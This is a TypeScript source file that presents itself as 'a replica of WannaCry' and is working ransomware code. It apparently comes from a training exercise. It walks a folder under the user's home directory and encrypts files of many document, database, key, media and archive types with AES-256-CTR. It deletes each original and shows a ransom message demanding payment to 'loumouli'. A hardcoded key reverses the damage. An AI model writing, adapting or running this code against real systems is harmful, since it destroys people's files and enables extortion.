import * as crypto from "crypto";
import fs from 'fs';

const KEY: string = 'IThr1YRwjTxtrtzbM7RUbF0UdVDx9qNjYTryvf5s1Gih9xnSKl51INbX3NgPcQEJ3W-1ZtpJM1LP2gszMNqfWQ';
let key: string = crypto.createHash('sha256').update(KEY).digest('base64').substring(0, 32);
const algo: string = 'aes-256-ctr';
let silent: boolean = false;
let dir_path: string | undefined;

const extensions: string[] = [
    ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw",
    ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif",
    ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm",
    ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb",
    ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln",
    ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat",
    ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php",
    ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla",
    ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv",
    ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd",
    ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg",
    ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak",
    ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm",
    ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf", ".wk1",
    ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg",
    ".ost", ".pst", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm",
    ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm",
    ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc"
];

const display_help = ():void => {
    console.log('\t- This is a replica of WannaCry');
    console.log('\t- Send 1000 Wallet to loumouli to receive the key needed for decrypting your file')
    console.log('\t\t--reverse/-r [KEY] : reverse the infection');
    console.log('\t\t--silent/-s : the program will not produce any output');
    console.log('\t\t--version/-v: display the version of the program');
}

const check_ext = (file: string): boolean => {
    return extensions.some(ext => file.endsWith(ext));
}

const decrypt = (buff_encrypted: Buffer): Buffer => {
    const iv: Buffer = buff_encrypted.subarray(0, 16);
    buff_encrypted = buff_encrypted.subarray(16);
    const decipher: crypto.Decipher = crypto.createDecipheriv(algo, key, iv);
    return Buffer.concat([decipher.update(buff_encrypted), decipher.final()]);
}

const encrypt = (buffer: Buffer): Buffer => {
    const iv: Buffer = crypto.randomBytes(16);
    const cipher: crypto.Cipher = crypto.createCipheriv(algo, key, iv);
    return Buffer.concat([iv, cipher.update(buffer), cipher.final()]);
}

const reverse_file = async (user_key: string): Promise<void> => {
    if (user_key != key)
        throw new Error('Wrong Key...');
    let files: string[];
    try {
        // @ts-ignore
        files = await fs.promises.readdir(dir_path);
    } catch (err) {
        throw new Error("reverse_file: readdir: " + err);
    }
    files = files.filter((file: string) => file.endsWith('.ft'));
    for (const iter in files) {
        const file: string = files[iter];
        let path: string = dir_path + '/' + file;
        try {
            let content: Buffer = await fs.promises.readFile(path);
            if (content.toLocaleString() === '')
                throw new Error('Error reading file');
            await fs.promises.unlink(path);
            let content_decrypt: Buffer = decrypt(content);
            path = path.substring(0, path.lastIndexOf('.'));
            await fs.promises.writeFile(path, content_decrypt);
            if (!silent)
                console.log(file + ' decrypted');
        } catch (err) {
            console.warn(path + ' :', String(err));
        }
    }
}

const perform_encrypt = async (): Promise<void> => {
    let files: string[];
    try {
        // @ts-ignore
        files = await fs.promises.readdir(dir_path);
    }
     catch (err) {
        throw new Error("perform_encrypt: readdir: " + dir_path + ' '+ err);
     }
    files = files.filter((file: string) => check_ext(file));
    for (const iter in files) {
        const path: string = dir_path + '/' + files[iter];
        try {
            let content: Buffer = await fs.promises.readFile(path);
            if (content.toLocaleString() === '')
                throw new Error('Error reading file');
            await fs.promises.unlink(path);
            let content_encrypted: Buffer = encrypt(content);
            await fs.promises.writeFile(path + '.ft', content_encrypted);
            if (!silent)
                console.log(files[iter] + ' encrypted');
        } catch (err) {
            console.warn(path + ':', String(err));
        }

    }
}

const main = async (argv: any): Promise<void> => {
    argv.shift();
    argv.shift(); // pop two first value (name of program,...)
    for (const value of argv) {
        const index: number = argv.indexOf(value);
        if (value === '-v' || value === '--version') {
            console.log("Version 1.0");
            process.exit(0);
        }
        else if (value === '-h'  || value === '--help') {
            display_help();
            process.exit(0);
        }
        else if (value === '-s'  || value === '--silent')
            silent = true;
        else if (value === '-r' || value === '--reverse') {
            if (argv.length <= index + 1) {
                console.warn('Cant find key after --reverse/-r');
                display_help();
                throw new Error("Runtime Error");
            }
            await reverse_file(argv[index + 1]);
            process.exit(1);
        }
        else {
            display_help();
            throw new Error('Wrong flag');
        }

    }
    await perform_encrypt();
}
const env = process.env;
dir_path = env["HOME"];
if (dir_path == undefined) {
    console.warn('cant find $HOME env value');
} else {
    console.log("HOME var found = ", dir_path);
    try {
        dir_path += '/inception';
        if (dir_path)
            await main(process.argv);
    } catch (err) {
        console.warn(String(err));
    }
}
